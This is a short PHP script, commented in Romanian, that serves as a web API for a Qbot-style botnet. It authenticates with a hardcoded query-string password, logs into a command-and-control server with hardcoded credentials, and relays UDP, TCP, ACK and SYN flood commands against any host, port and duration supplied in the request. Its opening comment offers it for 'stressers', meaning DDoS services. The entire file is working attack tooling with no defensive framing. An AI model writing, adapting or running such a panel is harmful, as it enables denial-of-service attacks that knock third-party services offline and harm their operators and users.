<?php


//You can use your botnet for stressers/tools.

if ($_GET['qbot'] != "gsdKBG@#$"){

die("Sau nu.");

}

 

    //Conectare la server.

        $socket = fsockopen("1.1.0.0", 10);

        ($socket ? null : die("Nu ma pot conecta."));

        fwrite($socket, "api\n"); //user

        fwrite($socket, "kyscunt934\n"); //parola

       

   

        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;

        $port = preg_replace('/\D/', '', $port);

        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();

        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;

        $time = preg_replace('/\D/', '', $time);

        $domain = $_GET['host'];

        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))

        {

            die("Invalid Domain");

        }      

       

    //Executarea metodelor de flood.   

        if($_GET['method'] == "RAWUDP") {  fwrite($socket, "!* UDP {$ip} {$port} {$time} 32 1024 1\n");                //Raw UDP

            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with UDP'; }

        elseif($_GET['method'] == "RAWTCP") { fwrite($socket, "!* TCP {$ip} {$port} {$time} 32 all 1024 1\n");           //Raw TCP

            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with TCP'; }

		elseif($_GET['method'] == "ACK") { fwrite($socket, "!* TCP {$ip} {$port} {$time} 32 ack 1024 1\n");           //Raw ACK

            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with ACK'; }

		elseif($_GET['method'] == "SYN") { fwrite($socket, "!* TCP {$ip} {$port} {$time} 32 syn 1024 1\n");           //Raw SYN

            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with ACK'; }			

        elseif($_GET['method'] == "KILL") { fwrite($socket, "!* KILLATTK\n");                                       //STOP ALL ATTACKS RUNNING

            echo 'Attack stopped.';  }

       

       

       

       

        fclose($socket);

 

 

?>